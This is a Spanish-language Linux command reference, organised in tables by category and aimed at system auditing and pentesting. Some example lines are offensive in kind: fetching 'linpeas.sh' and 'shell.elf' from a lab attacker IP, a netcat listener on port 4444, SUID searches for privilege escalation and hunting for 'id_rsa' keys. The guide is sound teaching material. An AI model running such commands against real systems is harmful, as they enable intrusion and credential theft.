# Guia de Referencia: Comandos de Linux

Documento de referencia rapida y organizada por categorias para consultar la sintaxis, propositos, banderas clave y ejemplos de uso en auditorias y administracion de sistemas Linux.

---

## Indice de Categorias

1. [Ayuda y Documentacion](#ayuda-y-documentacion)
2. [Navegacion y Rutas](#navegacion-y-rutas)
3. [Exploracion y Listado](#exploracion-y-listado)
4. [Gestion de Archivos y Directorios](#gestion-de-archivos-y-directorios)
5. [Visualizacion y Lectura de Archivos](#visualizacion-y-lectura-de-archivos)
6. [Busqueda y Localizacion](#busqueda-y-localizacion)
7. [Filtrado y Procesamiento de Texto](#filtrado-y-procesamiento-de-texto)
8. [Permisos y Propiedad](#permisos-y-propiedad)
9. [Usuarios, Grupos e Identidad](#usuarios-grupos-e-identidad)
10. [Procesos y Servicios](#procesos-y-servicios)
11. [Redes y Transferencia de Archivos](#redes-y-transferencia-de-archivos)
12. [Compresion y Empaquetado](#compresion-y-empaquetado)
13. [Informacion del Sistema y Recursos](#informacion-del-sistema-y-recursos)

---

## Ayuda y Documentacion

Linux provee mecanismos internos para consultar la sintaxis, parametros y descripcion de cualquier herramienta disponible.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`man`** | `man <comando>` | Abre el manual oficial de la herramienta seleccionada. | `man ls` |
| **`apropos`** | `apropos <palabra_clave>` | Busca en las descripciones de todas las paginas del manual por coincidencias con la palabra clave. | `apropos "directory listing"` |
| **`--help`** / **`-h`** | `<comando> --help` | Muestra un resumen rapido de opciones y banderas directamente en la salida estandar. | `grep --help` |
| **`whatis`** | `whatis <comando>` | Muestra una descripcion de una sola linea sobre el comando. | `whatis cat` |

> [!TIP]
> Dentro de una pagina de `man`, presiona `/` seguido del termino a buscar y pulsa `Enter`. Usa `n` para ir al siguiente resultado, `N` para el anterior y `q` para salir.

---

## Navegacion y Rutas

Comandos para conocer la ubicacion actual y desplazarse por la jerarquia de directorios.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`pwd`** | `pwd` | Muestra la ruta absoluta del directorio de trabajo actual (*Print Working Directory*). | `pwd` |
| **`cd`** | `cd <ruta>` | Cambia el directorio de trabajo a la ruta especificada. | `cd /var/log` |
| **`cd ~`** / **`cd`** | `cd` | Regresa directamente al directorio personal (*home*) del usuario actual. | `cd` |
| **`cd ..`** | `cd ..` | Sube un nivel hacia el directorio padre. | `cd ..` |
| **`cd -`** | `cd -` | Regresa al directorio de trabajo anterior donde te encontrabas. | `cd -` |

---

## Exploracion y Listado

Comandos e indicadores para inspeccionar el contenido de directorios.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`ls`** | `ls [opciones] [ruta]` | Lista el contenido de archivos y carpetas. | `ls /etc` |
| **`ls -la`** | `ls -la [ruta]` | Lista en formato largo incluyendo archivos ocultos. | `ls -la ~` |
| **`ls -lh`** | `ls -lh [ruta]` | Formato largo con tamanos legibles (*human-readable*: KB, MB, GB). | `ls -lh /var/log` |
| **`tree`** | `tree [opciones] [ruta]` | Muestra la estructura de directorios y subdirectorios en forma de arbol grafico. | `tree -L 2 /var/www` |

### Banderas Comunes de `ls`:
* `-l` : Listado en formato largo (detalla permisos, enlaces, propietario, grupo, tamano y fecha de modificacion).
* `-a` : Muestra archivos ocultos (aquellos que inician con un punto `.`).
* `-h` : Formato legible de tamanos (se usa con `-l`).
* `-t` : Ordena por fecha de modificacion (los mas recientes primero).
* `-S` : Ordena por tamano de archivo (los mas grandes primero).
* `-r` : Invierte el orden del listado.
* `-R` : Lista directorios de manera recursiva.

---

## Gestion de Archivos y Directorios

Operaciones fundamentales de creacion, copia, movimiento y eliminacion.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`touch`** | `touch <archivo>` | Crea un archivo vacio o actualiza la fecha de modificacion de uno existente. | `touch notes.txt` |
| **`mkdir`** | `mkdir [opciones] <carpeta>` | Crea uno o varios directorios. | `mkdir recon` |
| **`mkdir -p`** | `mkdir -p <ruta/anidada>` | Crea toda la estructura de carpetas intermedias si no existen. | `mkdir -p target/scans/nmap` |
| **`cp`** | `cp <origen> <destino>` | Copia archivos de una ubicacion a otra. | `cp /etc/passwd ./passwd.bak` |
| **`cp -r`** | `cp -r <dir_origen> <dir_destino>` | Copia directorios completos de forma recursiva. | `cp -r /var/www/html ./backup_web` |
| **`mv`** | `mv <origen> <destino>` | Mueve o renombra archivos y directorios. | `mv payload.bin /tmp/` |
| **`rm`** | `rm [opciones] <archivo>` | Elimina archivos del sistema. | `rm old_scan.txt` |
| **`rm -rf`** | `rm -rf <directorio>` | Elimina directorios y todo su contenido de forma recursiva y forzada sin confirmacion. | `rm -rf /tmp/recon_temp` |
| **`ln -s`** | `ln -s <objetivo> <enlace>` | Crea un enlace simbolico (acceso directo) hacia un archivo o directorio. | `ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/` |

---

## Visualizacion y Lectura de Archivos

Comandos para inspeccionar el contenido de archivos de texto.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`cat`** | `cat <archivo>` | Concatena e imprime el contenido completo del archivo en pantalla. | `cat /etc/hosts` |
| **`tac`** | `tac <archivo>` | Imprime el contenido en orden inverso (linea por linea, desde el final hacia el inicio). | `tac /var/log/auth.log` |
| **`nl`** | `nl <archivo>` | Imprime el archivo numerando todas las lineas de texto. | `nl script.sh` |
| **`less`** | `less <archivo>` | Visor paginado interactivo. Permite navegar hacia adelante y hacia atras sin saturar la terminal. | `less /var/log/syslog` |
| **`more`** | `more <archivo>` | Visor paginado basico para desplazarse hacia adelante pantalla por pantalla. | `more /etc/services` |
| **`head`** | `head -n <num> <archivo>` | Muestra las primeras lineas de un archivo (por defecto 10). | `head -n 20 /etc/passwd` |
| **`tail`** | `tail -n <num> <archivo>` | Muestra las ultimas lineas de un archivo (por defecto 10). | `tail -n 15 /var/log/apache2/access.log` |
| **`tail -f`** | `tail -f <archivo>` | Sigue la salida del archivo en tiempo real a medida que se escriben nuevos registros. | `tail -f /var/log/auth.log` |
| **`xxd`** / **`hexdump`** | `xxd <archivo>` | Muestra el volcado hexadecimal y representacion ASCII de archivos binarios. | `xxd -l 64 /bin/ls` |

---

## Busqueda y Localizacion

Herramientas para encontrar archivos, binarios o rutas especificas en el disco.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`which`** | `which <comando>` | Devuelve la ruta absoluta del binario ejecutable que se ejecutaria segun la variable `$PATH`. | `which nmap` |
| **`whereis`** | `whereis <nombre>` | Localiza el binario, codigo fuente y pagina del manual de un comando. | `whereis python` |
| **`locate`** | `locate <patron>` | Busca archivos rapidamente usando una base de datos indexada (`updatedb`). | `locate id_rsa` |
| **`find`** | `find <ruta> [criterios]` | Busca archivos y carpetas en tiempo real segun nombres, tamanos, permisos, fechas o tipos. | `find / -name "*.conf" 2>/dev/null` |

### Casos de Uso Clave con `find` para Auditorias / Pentesting:
```bash
# Buscar archivos por nombre insensible a mayusculas/minusculas
find /var/www -iname "*.php"

# Buscar binarios con bit SUID activo (vectores de escalada de privilegios)
find / -perm -4000 -type f 2>/dev/null

# Buscar archivos modificados en los ultimos 2 dias
find /home -mtime -2

# Buscar archivos con tamano mayor a 50MB
find /var/log -type f -size +50M

# Buscar archivos con permisos de escritura para cualquier usuario (World-Writable)
find / -perm -222 -type d 2>/dev/null
```

---

## Filtrado y Procesamiento de Texto

Comandos para transformar, filtrar, recortar y analizar datos en texto plano.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`grep`** | `grep [opciones] "patron" <archivo>` | Busca y filtra lineas que coincidan con una expresion regular o texto. | `grep "root" /etc/passwd` |
| **`cut`** | `cut -d '<delimitador>' -f <campo>` | Extrae columnas o campos especificos delimitados por un caracter. | `cut -d ':' -f 1 /etc/passwd` |
| **`awk`** | `awk '{print $1}' <archivo>` | Lenguaje de procesamiento de texto estructurado por columnas. | `ps aux \| awk '{print $1, $2, $11}'` |
| **`sed`** | `sed 's/antiguo/nuevo/g' <archivo>` | Editor de flujo para reemplazar o transformar texto mediante patrones. | `sed 's/127.0.0.1/10.10.14.5/g' config.php` |
| **`sort`** | `sort [opciones] <archivo>` | Ordena lineas de texto alfabeticamente o numericamente. | `sort -u wordlist.txt` |
| **`uniq`** | `uniq [opciones]` | Omite o reporta lineas repetidas adyacentes (requiere ordenar previamente). | `sort list.txt \| uniq -c` |
| **`tr`** | `tr <origen> <destino>` | Traduce, sustituye o elimina caracteres especificos de la entrada estandar. | `cat string.txt \| tr 'a-z' 'A-Z'` |
| **`wc`** | `wc [opciones] <archivo>` | Cuenta lineas (`-l`), palabras (`-w`) o bytes/caracteres (`-c`). | `wc -l /etc/passwd` |

### Banderas Principales de `grep`:
* `-i` : Ignora distincion entre mayusculas y minusculas (*case-insensitive*).
* `-r` / `-R` : Busqueda recursiva en todos los subdirectorios.
* `-v` : Invierte la seleccion (muestra lineas que **no** coinciden con el patron).
* `-n` : Muestra el numero de linea donde se encuentra la coincidencia.
* `-E` : Habilita expresiones regulares extendidas (equivalente a `egrep`).
* `-c` : Muestra unicamente el recuento de lineas coincidentes.

---

## Permisos y Propiedad

Administracion del modelo de seguridad de archivos y carpetas.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`chmod`** | `chmod <modo> <archivo>` | Modifica los permisos de lectura, escritura y ejecucion. | `chmod 755 script.sh` |
| **`chmod +x`** | `chmod +x <archivo>` | Anade permiso de ejecucion a todos los usuarios. | `chmod +x exploit.py` |
| **`chown`** | `chown <usuario>:<grupo> <archivo>` | Cambia el usuario propietario y el grupo de un archivo. | `chown www-data:www-data /var/www/html` |
| **`chgrp`** | `chgrp <grupo> <archivo>` | Modifica exclusivamente el grupo propietario. | `chgrp shadow /etc/gshadow` |
| **`umask`** | `umask [valor]` | Muestra o define la mascara de permisos por defecto para nuevos archivos creados. | `umask 022` |

---

## Usuarios, Grupos e Identidad

Comandos para auditar cuentas locales, membresias y elevar privilegios.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`whoami`** | `whoami` | Imprime el nombre del usuario efectivo con el que operas. | `whoami` |
| **`id`** | `id [usuario]` | Muestra el UID, GID y todos los grupos a los que pertenece el usuario. | `id` |
| **`groups`** | `groups [usuario]` | Lista unicamente los grupos del usuario. | `groups` |
| **`w`** / **`who`** | `w` | Muestra quien esta conectado en el sistema y que comandos esta ejecutando. | `w` |
| **`last`** | `last [opciones]` | Muestra el historial de inicios y cierres de sesion de los usuarios. | `last -n 10` |
| **`sudo -l`** | `sudo -l` | Lista los comandos permitidos que el usuario actual puede ejecutar como superusuario con `sudo`. | `sudo -l` |
| **`su`** | `su - <usuario>` | Cambia de sesion a otro usuario cargando sus variables de entorno. | `su - root` |
| **`useradd`** | `useradd -m -s /bin/bash <usuario>` | Crea una nueva cuenta de usuario en el sistema. | `useradd -m -s /bin/bash auditor` |
| **`usermod`** | `usermod -aG <grupo> <usuario>` | Modifica las propiedades del usuario (ej. agregar a grupo sudo). | `usermod -aG sudo auditor` |
| **`passwd`** | `passwd [usuario]` | Cambia la contrasena de un usuario. | `passwd root` |

---

## Procesos y Servicios

Monitoreo y control de programas en ejecucion y demonios del sistema.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`ps`** | `ps aux` | Lista todos los procesos en ejecucion detallando usuario, PID, consumo de CPU/Memoria y comando. | `ps aux \| grep apache` |
| **`top`** | `top` | Monitor interactivo de recursos y procesos en tiempo real. | `top` |
| **`htop`** | `htop` | Version mejorada e interactiva de top con barras visuales y navegacion sencilla. | `htop` |
| **`pgrep`** | `pgrep <nombre_proceso>` | Busca y devuelve el PID de los procesos que coincidan con el nombre. | `pgrep sshd` |
| **`kill`** | `kill -<senal> <PID>` | Envia una senal para terminar o pausar un proceso por su ID. | `kill -9 1337` |
| **`pkill`** | `pkill -<senal> <nombre>` | Mata procesos coincidentes por su nombre en lugar de su PID. | `pkill -9 python3` |
| **`systemctl`** | `systemctl <accion> <servicio>` | Controla el gestor de servicios systemd (`status`, `start`, `stop`, `restart`, `enable`). | `systemctl status ssh` |
| **`journalctl`** | `journalctl -u <servicio> -f` | Consulta los logs del sistema y de servicios especificos de systemd. | `journalctl -u nginx -n 50` |

### Senales Comunes para `kill`:
* `SIGTERM` (`15`): Solicitud estandar y limpia de terminacion.
* `SIGKILL` (`9`): Fuerza la terminacion inmediata e incondicional del proceso.
* `SIGHUP` (`1`): Recarga la configuracion del proceso sin detener el servicio.

---

## Redes y Transferencia de Archivos

Comandos para diagnostico de interfaces, puertos abiertos y movimiento de archivos.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`ip a`** | `ip addr` / `ip a` | Muestra todas las interfaces de red configuradas y sus direcciones IP. | `ip a` |
| **`ip route`** | `ip route` | Muestra la tabla de enrutamiento y la puerta de enlace predeterminada. | `ip route` |
| **`ping`** | `ping -c <num> <host>` | Envia paquetes ICMP para verificar la conectividad con un host remoto. | `ping -c 4 10.10.10.1` |
| **`ss`** | `ss -tulpn` | Muestra sockets y puertos TCP/UDP abiertos a la escucha (`LISTEN`) con su PID. | `ss -tulpn` |
| **`netstat`** | `netstat -tulnp` | Herramienta clasica para listar conexiones y puertos en escucha. | `netstat -tulnp` |
| **`curl`** | `curl [opciones] <URL>` | Realiza peticiones HTTP/HTTPS y permite transferir datos. | `curl -O http://10.10.14.5/linpeas.sh` |
| **`wget`** | `wget <URL>` | Descarga archivos directamente desde la web por HTTP/HTTPS/FTP. | `wget http://10.10.14.5/shell.elf` |
| **`nc` (netcat)** | `nc [opciones] <host> <puerto>` | Establece conexiones TCP/UDP arbitrarias, escucha puertos y transfiere flujos de datos. | `nc -lvnp 4444` |
| **`ssh`** | `ssh <usuario>@<host>` | Conecta de forma segura a una shell remota mediante el protocolo SSH. | `ssh root@10.10.10.50 -i id_rsa` |
| **`scp`** | `scp <origen> <destino>` | Copia archivos de forma segura entre equipos a traves de SSH. | `scp exploit.py user@10.10.10.50:/tmp/` |

---

## Compresion y Empaquetado

Gestion de archivos comprimidos y empaquetados en formatos comunes.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`tar -czvf`** | `tar -czvf <archivo.tar.gz> <directorio>` | Empaqueta y comprime un directorio utilizando gzip. | `tar -czvf backup.tar.gz /var/www/html` |
| **`tar -xzvf`** | `tar -xzvf <archivo.tar.gz>` | Descomprime y extrae el contenido de un archivo `.tar.gz`. | `tar -xzvf archive.tar.gz` |
| **`zip`** | `zip -r <archivo.zip> <directorio>` | Comprime un directorio en formato ZIP. | `zip -r data.zip ./data` |
| **`unzip`** | `unzip <archivo.zip>` | Extrae el contenido de un archivo ZIP. | `unzip bundle.zip` |
| **`gzip`** / **`gunzip`** | `gzip <archivo>` / `gunzip <archivo.gz>` | Comprime o descomprime un archivo individual reemplazandolo por su version `.gz`. | `gunzip /usr/share/wordlists/rockyou.txt.gz` |

---

## Informacion del Sistema y Recursos

Consultas directas sobre el kernel, arquitectura, almacenamiento y memoria del equipo.

| Comando | Sintaxis Basica | Descripcion | Ejemplo de Uso |
| :--- | :--- | :--- | :--- |
| **`uname`** | `uname -a` | Muestra la version del kernel, nombre del host y arquitectura de la maquina (x86_64, aarch64, etc.). | `uname -a` |
| **`lsb_release`** / **`cat /etc/os-release`** | `cat /etc/os-release` | Muestra la distribucion y version exacta de Linux instalada (Debian, Ubuntu, Kali, etc.). | `cat /etc/os-release` |
| **`df`** | `df -h` | Muestra el espacio libre y ocupado en los sistemas de archivos montados (*human-readable*). | `df -h` |
| **`du`** | `du -sh <directorio>` | Muestra el tamano total en disco ocupado por un directorio o archivo. | `du -sh /var/log` |
| **`free`** | `free -h` | Muestra la cantidad de memoria RAM y espacio Swap total, usado y disponible. | `free -h` |
| **`uptime`** | `uptime` | Muestra cuanto tiempo ha estado encendido el sistema y la carga promedio (*Load Average*). | `uptime` |
